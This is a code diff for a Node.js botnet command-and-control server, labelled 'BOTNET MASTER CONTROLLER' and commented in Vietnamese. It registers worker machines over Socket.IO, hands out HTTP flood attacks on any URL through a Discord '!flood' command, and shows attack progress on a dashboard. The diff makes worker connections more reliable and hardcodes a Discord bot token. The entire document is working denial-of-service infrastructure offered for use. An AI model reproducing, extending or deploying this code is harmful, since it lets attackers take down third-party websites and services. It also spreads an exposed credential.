@@ -13,8 +13,8 @@ const path = require('path');
 const fs = require('fs');
 
 // ==================== CONFIG ====================
-const PORT = process.env.PORT || 10000; // Render sẽ set PORT=10000
-const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.GU7L1Q.2gDvkFqOOoheWQRJvvi2xz7xFMK71r7qoRj6w8';
+const PORT = process.env.PORT || 10000;
+const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.GOG5Sq.h1koEOQWbyC5n3W3vxxDgZ8rzCZ4EilxFFO5B8';
 const CHANNEL_ID = '1456595444477198508';
 
 // ==================== KIỂM TRA CONFIG ====================
@@ -32,27 +32,36 @@ if (CHANNEL_ID === 'YOUR_CHANNEL_ID_HERE') {
 const app = express();
 const server = http.createServer(app);
 
-// Cấu hình CORS cho Socket.IO - QUAN TRỌNG cho Render
+// Cấu hình Socket.IO - SIÊU ỔN ĐỊNH
 const io = new Server(server, {
     cors: {
-        origin: "*", // Cho phép mọi nguồn kết nối
+        origin: "*",
         methods: ["GET", "POST"],
         credentials: true,
         allowedHeaders: ["*"]
     },
-    transports: ['websocket', 'polling'], // Hỗ trợ cả WebSocket và Polling
+    transports: ['websocket', 'polling'],
     allowEIO3: true,
-    pingTimeout: 60000,
-    pingInterval: 25000
+    pingTimeout: 60000,        // 60 giây
+    pingInterval: 25000,        // 25 giây
+    connectTimeout: 60000,
+    maxHttpBufferSize: 1e8,
+    cookie: false
 });
 
 // ==================== MIDDLEWARE ====================
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
+// ==================== BIẾN TOÀN CỤC ====================
+let workers = new Map(); // { socket.id: { socket, ip, status, target, lastSeen } }
+let currentAttack = null;
+let totalRequests = 0;
+let attackStartTime = null;
+
 // ==================== ROUTES ====================
 
-// Route chính - Hiển thị trạng thái
+// Route chính
 app.get('/', (req, res) => {
     const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
     
@@ -65,7 +74,7 @@ app.get('/', (req, res) => {
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
                 body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; }
-                .container { max-width: 800px; margin: 0 auto; }
+                .container { max-width: 1200px; margin: 0 auto; }
                 .card { background: #1a1a1a; border-radius: 10px; padding: 20px; margin: 10px 0; }
                 .stat { font-size: 24px; color: #00ff00; }
                 .label { color: #888; }
@@ -74,18 +83,37 @@ app.get('/', (req, res) => {
                 table { width: 100%; border-collapse: collapse; }
                 th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
                 th { color: #00ff00; }
+                .online { color: #00ff00; }
+                .offline { color: #ff4444; }
             </style>
             <meta http-equiv="refresh" content="5">
         </head>
         <body>
             <div class="container">
                 <h1>🔥 BOTNET MASTER CONTROLLER</h1>
+                
                 <div class="card">
                     <h2>System Status</h2>
-                    <p><span class="label">Workers:</span> <span class="stat">${workers.size}</span></p>
-                    <p><span class="label">Status:</span> <span class="stat ${attacking > 0 ? 'attacking' : ''}">${attacking > 0 ? '🔥 ATTACKING' : '💤 IDLE'}</span></p>
-                    <p><span class="label">Total Requests:</span> <span class="stat">${totalRequests.toLocaleString()}</span></p>
-                    <p><span class="label">Port:</span> <span class="stat">${PORT}</span></p>
+                    <table>
+                        <tr><td class="label">Workers Online:</td><td class="stat">${workers.size}</td></tr>
+                        <tr><td class="label">Status:</td><td class="stat ${attacking > 0 ? 'attacking' : ''}">${attacking > 0 ? '🔥 ATTACKING' : '💤 IDLE'}</td></tr>
+                        <tr><td class="label">Total Requests:</td><td class="stat">${totalRequests.toLocaleString()}</td></tr>
+                        <tr><td class="label">Port:</td><td class="stat">${PORT}</td></tr>
+                        <tr><td class="label">Uptime:</td><td class="stat">${Math.floor(process.uptime() / 60)} minutes</td></tr>
+                    </table>
+                </div>
+                
+                <div class="card">
+                    <h2>Current Attack</h2>
+                    ${currentAttack ? `
+                    <table>
+                        <tr><td class="label">Target:</td><td class="attacking">${currentAttack.target}</td></tr>
+                        <tr><td class="label">Time:</td><td>${Math.floor((Date.now() - currentAttack.start) / 1000)}s / ${currentAttack.time}s</td></tr>
+                        <tr><td class="label">Rate/Worker:</td><td>${currentAttack.rate}</td></tr>
+                        <tr><td class="label">Threads/Worker:</td><td>${currentAttack.threads}</td></tr>
+                        <tr><td class="label">Workers Attacking:</td><td>${attacking}</td></tr>
+                    </table>
+                    ` : '<p>No active attack</p>'}
                 </div>
                 
                 <div class="card">
@@ -96,26 +124,30 @@ app.get('/', (req, res) => {
                             <th>Status</th>
                             <th>Target</th>
                             <th>Last Seen</th>
+                            <th>Connection</th>
                         </tr>
-                        ${Array.from(workers.values()).map(w => `
+                        ${Array.from(workers.entries()).map(([id, w]) => `
                         <tr>
                             <td>${w.ip}</td>
                             <td class="${w.status === 'attacking' ? 'attacking' : 'idle'}">${w.status === 'attacking' ? '🔥 ATTACKING' : '💤 IDLE'}</td>
                             <td>${w.target || '-'}</td>
                             <td>${Math.floor((Date.now() - w.lastSeen) / 1000)}s ago</td>
+                            <td class="${w.socket?.connected ? 'online' : 'offline'}">${w.socket?.connected ? '✅ ONLINE' : '❌ OFFLINE'}</td>
                         </tr>
                         `).join('')}
-                        ${workers.size === 0 ? '<tr><td colspan="4" style="text-align:center">No workers connected</td></tr>' : ''}
+                        ${workers.size === 0 ? '<tr><td colspan="5" style="text-align:center">No workers connected</td></tr>' : ''}
                     </table>
                 </div>
                 
                 <div class="card">
                     <h2>Discord Commands</h2>
-                    <p><code>!workers</code> - Xem danh sách worker</p>
-                    <p><code>!flood &lt;url&gt; &lt;time&gt; &lt;rate&gt; &lt;threads&gt;</code> - Bắt đầu tấn công</p>
-                    <p><code>!stop</code> - Dừng tấn công</p>
-                    <p><code>!status</code> - Xem trạng thái</p>
-                    <p><code>!help</code> - Xem hướng dẫn</p>
+                    <table>
+                        <tr><td><code>!workers</code></td><td>- Xem danh sách worker</td></tr>
+                        <tr><td><code>!flood &lt;url&gt; &lt;time&gt; &lt;rate&gt; &lt;threads&gt;</code></td><td>- Bắt đầu tấn công</td></tr>
+                        <tr><td><code>!stop</code></td><td>- Dừng tấn công</td></tr>
+                        <tr><td><code>!status</code></td><td>- Xem trạng thái</td></tr>
+                        <tr><td><code>!help</code></td><td>- Xem hướng dẫn</td></tr>
+                    </table>
                 </div>
             </div>
         </body>
@@ -123,7 +155,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// Route API - Lấy trạng thái dạng JSON
+// Route API
 app.get('/api/status', (req, res) => {
     const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
     
@@ -143,41 +175,30 @@ app.get('/api/status', (req, res) => {
             ip: w.ip,
             status: w.status,
             target: w.target,
-            lastSeen: w.lastSeen
+            lastSeen: w.lastSeen,
+            connected: w.socket?.connected || false
         }))
     });
 });
 
-// Route kiểm tra sức khỏe - Render dùng để kiểm tra service
+// Health check
 app.get('/health', (req, res) => {
     res.json({ 
         status: 'ok', 
         workers: workers.size,
         port: PORT,
-        uptime: process.uptime()
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        connections: Object.keys(io.sockets.sockets || {}).length
     });
 });
 
-// Route cho Socket.IO - Kiểm tra kết nối
-app.get('/socket-test', (req, res) => {
-    res.json({ 
-        message: 'Socket.IO server is running',
-        transports: io.engine?.transports || ['polling', 'websocket']
-    });
-});
-
-// ==================== BIẾN TOÀN CỤC ====================
-let workers = new Map(); // Lưu thông tin worker
-let currentAttack = null;
-let totalRequests = 0;
-let attackStartTime = null;
-
-// ==================== SOCKET.IO - NHẬN KẾT NỐI TỪ WORKER ====================
+// ==================== SOCKET.IO - XỬ LÝ WORKER ====================
 io.on('connection', (socket) => {
     const clientIp = socket.handshake.address;
     console.log(`[+] Worker connected: ${socket.id} from ${clientIp}`);
 
-    // Worker gửi thông tin đăng ký
+    // Đăng ký worker
     socket.on('register', (data) => {
         const workerIp = data.ip || clientIp;
         
@@ -191,39 +212,47 @@ io.on('connection', (socket) => {
         
         console.log(`[+] Worker registered: ${workerIp} (Total: ${workers.size})`);
 
-        // Nếu đang có attack, tự động gửi lệnh cho worker mới
+        // Nếu đang có attack, gửi lệnh cho worker mới
         if (currentAttack) {
             socket.emit('attack', currentAttack);
             workers.get(socket.id).status = 'attacking';
             workers.get(socket.id).target = currentAttack.target;
-            console.log(`[+] Sent ongoing attack to new worker: ${workerIp}`);
         }
 
-        // Gửi xác nhận
         socket.emit('registered', { status: 'ok', workers: workers.size });
     });
 
-    // Worker gửi stats
+    // Xử lý ping - GIỮ KẾT NỐI
+    socket.on('ping', () => {
+        socket.emit('pong');
+        const worker = workers.get(socket.id);
+        if (worker) {
+            worker.lastSeen = Date.now();
+        }
+    });
+
+    // Nhận stats từ worker
     socket.on('stats', (data) => {
         const worker = workers.get(socket.id);
         if (worker) {
             worker.lastSeen = Date.now();
-            if (data.count) {
+            if (data && data.count) {
                 totalRequests += data.count;
             }
         }
     });
 
-    // Worker gửi heartbeat
-    socket.on('ping', () => {
-        socket.emit('pong');
-    });
-
-    // Worker ngắt kết nối
+    // Xử lý ngắt kết nối
     socket.on('disconnect', (reason) => {
         const worker = workers.get(socket.id);
         if (worker) {
             console.log(`[-] Worker disconnected: ${worker.ip} - Reason: ${reason}`);
+            
+            // Nếu worker đang attack, cập nhật trạng thái
+            if (worker.status === 'attacking' && currentAttack) {
+                console.log(`[!] Worker ${worker.ip} lost during attack`);
+            }
+            
             workers.delete(socket.id);
         }
     });
@@ -233,6 +262,32 @@ io.on('connection', (socket) => {
         console.error(`[!] Socket error from ${socket.id}:`, error.message);
     });
 });
+
+// ==================== GIỮ KẾT NỐI WORKER ====================
+
+// Gửi ping định kỳ đến tất cả worker
+setInterval(() => {
+    workers.forEach((worker, id) => {
+        if (worker.socket && worker.socket.connected) {
+            worker.socket.emit('ping');
+        }
+    });
+}, 15000); // 15 giây
+
+// Kiểm tra worker chết và xóa
+setInterval(() => {
+    const now = Date.now();
+    workers.forEach((worker, id) => {
+        // Nếu worker không gửi heartbeat trong 60 giây, coi như chết
+        if (now - worker.lastSeen > 60000) {
+            console.log(`[-] Worker ${worker.ip} timeout, removing...`);
+            if (worker.socket) {
+                worker.socket.disconnect(true);
+            }
+            workers.delete(id);
+        }
+    });
+}, 30000); // 30 giây
 
 // ==================== DISCORD BOT ====================
 const discordClient = new Client({ 
@@ -254,7 +309,7 @@ discordClient.once('ready', () => {
 ╠══════════════════════════════════════════════════════╣
 ║  📡 Workers: ${workers.size}                                         ║
 ║  🌐 Port: ${PORT}                                            ║
-║  🔗 URL: CẶC                                               ║
+║  🔗 URL: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}  ║
 ╠══════════════════════════════════════════════════════╣
 ║  📚 COMMANDS:                                          ║
 ║  !flood <url> <time> <rate> <threads>                ║
@@ -342,7 +397,7 @@ discordClient.on('messageCreate', async (msg) => {
         // Gửi lệnh cho tất cả worker
         let sentCount = 0;
         workers.forEach((worker, id) => {
-            if (worker.status === 'idle') {
+            if (worker.status === 'idle' && worker.socket && worker.socket.connected) {
                 worker.socket.emit('attack', currentAttack);
                 worker.status = 'attacking';
                 worker.target = target;
@@ -429,28 +484,13 @@ discordClient.on('messageCreate', async (msg) => {
     }
 });
 
-// ==================== KIỂM TRA ĐỊNH KỲ WORKER CHẾT ====================
-setInterval(() => {
-    const now = Date.now();
-    workers.forEach((worker, id) => {
-        // Nếu worker không gửi heartbeat trong 30 giây, coi như chết
-        if (now - worker.lastSeen > 30000) {
-            console.log(`[-] Worker ${worker.ip} timeout, removing...`);
-            worker.socket.disconnect(true);
-            workers.delete(id);
-        }
-    });
-}, 10000);
-
-// ==================== START SERVER ====================
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`[+] Master server running on port ${PORT}`);
-    console.log(`[+] Connect URL: http://localhost:${PORT}`);
-    console.log(`[+] Public URL: https://control-12.onrender.com`);
-    console.log(`[+] Health check: https://control-12.onrender.com/health`);
+    console.log(`[+] Health check: http://localhost:${PORT}/health`);
+    console.log(`[+] Waiting for workers...`);
 });
 
-// Đăng nhập Discord
+// Discord login
 discordClient.login(TOKEN).catch(err => {
     console.error('[!] Discord login failed:', err.message);
 });
